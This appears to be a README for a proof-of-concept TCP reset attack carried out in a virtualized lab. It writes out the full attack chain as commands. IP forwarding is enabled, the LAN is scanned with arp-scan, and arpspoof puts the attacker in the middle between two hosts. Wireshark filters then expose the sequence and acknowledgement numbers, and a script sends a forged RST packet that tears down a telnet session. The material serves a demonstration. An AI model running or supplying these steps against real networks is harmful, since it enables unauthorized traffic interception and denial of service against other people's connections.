# TCP-reset-attack-PoC
A PoC that proves the TCP reset attack.
All the logical addresses, port, Sequence number and Acknowledgement number values in the following
commands are just examples. To be noticed that all the machines are each on a virtualized environment.
Steps:
1) Enable the IP forwarding on the attacker system:
echo 1 > /proc/sys/net/ipv4/ip_forward
2) We use the arp-scan command to find the IP addresses of the machines connected to the local network:
arp-scan -interface=eth0 –localnet
3) We used arpspoofing to intercept the traffic between the host A and host B using the IP addresses found in the last
step. Notice that the two hosts have the 192.168.0.40, respectively 192.168.0.39 IP addresses.
arpspoof -i eth0 -t 192.168.0.39 192.168.0.40
arpspoof -i eth0 -t 192.168.0.40 192.168.0.39
4) Next we filter the traffic to see only the packets we are interested on using Wireshark:
(ip.src==192.168.0.40&ip.dst==192.168.0.39)||(ip.src==192.168.0.39&ip.dst==192.168.0.40)
5) This way we find the application ports of both hosts, and also from the last packets we are able to get the right
Acknowledgement number and Sequence number to attack host A. Next we send a forged TCP packet with RST bit
set and the correct Sequence number and Acknowledgement number to the host A and therefore host A closes the
connection.
python script.py -S 192.168.0.40 -s 23 -D 192.168.0.39 -d 50638 -a 2620146587 -q 1393205321
